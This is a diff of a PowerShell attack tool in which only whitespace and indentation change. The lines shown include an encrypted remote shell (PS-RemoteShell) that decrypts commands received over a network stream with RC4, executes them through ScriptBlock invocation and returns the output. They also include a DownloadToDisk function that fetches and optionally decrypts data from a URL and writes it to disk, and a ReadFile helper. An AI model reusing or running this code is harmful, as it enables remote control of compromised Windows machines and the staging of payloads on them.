@@ -91,7 +91,6 @@ function Parse-Command {
     }
 }
 
-
 function Crypto-RC4 {
     [CmdletBinding()]
     Param (
@@ -147,7 +146,6 @@ function PS-RemoteShell {
 		[byte[]]$bytes = 0..255|%{0}
 		[byte[]]$sendData
 		
-		
 		$prompt = [text.encoding]::ASCII.GetBytes((Shell-Prompt))
 		$sendData = ($prompt | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
 		$stream.Write($sendData, 0, $sendData.Length)
@@ -155,8 +153,8 @@ function PS-RemoteShell {
 		while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 			
 			$Cmd = ($bytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
-            $Cmd = [Text.Encoding]::ASCII.GetString($Cmd, 0, $i)
-            $Cmd = Parse-Command -CmdArgs $Cmd -Key $key
+            		$Cmd = [Text.Encoding]::ASCII.GetString($Cmd, 0, $i)
+            		$Cmd = Parse-Command -CmdArgs $Cmd -Key $key
 
 			$Output = ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
 			$Output  = $Output + "`n"
@@ -199,18 +197,18 @@ function DownloadToDisk {
 	}	
 	
 	PROCESS {
-        $buffer = ""
-        Try {
-		    $data = (New-Object Net.WebClient).DownloadData($Url)
-            if(!$Key.Equals("null")) {
-		        $buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
-            } else {
-                $buffer = $data
-            }
-	        [System.Text.Encoding]::ASCII.GetString($buffer) | Out-File $Path
-        } Catch {
-            Display-Message -Module $moduleName -Message "failed to download $($Url)"
-        }
+		$buffer = ""
+		Try {
+			$data = (New-Object Net.WebClient).DownloadData($Url)
+			if(!$Key.Equals("null")) {
+				$buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+			} else {
+				$buffer = $data
+			}
+			[System.Text.Encoding]::ASCII.GetString($buffer) | Out-File $Path
+		} Catch {
+		    Display-Message -Module $moduleName -Message "failed to download $($Url)"
+		}
 	}
 
     END {
@@ -262,7 +260,7 @@ function ReadFile {
 
     BEGIN {
         $moduleName = "ReadFile"
-		Display-Message -Module $moduleName -Message "Reading $($Path)"
+	Display-Message -Module $moduleName -Message "Reading $($Path)"
         $buffer = Get-Content $Path
         Write-Output $buffer
     }
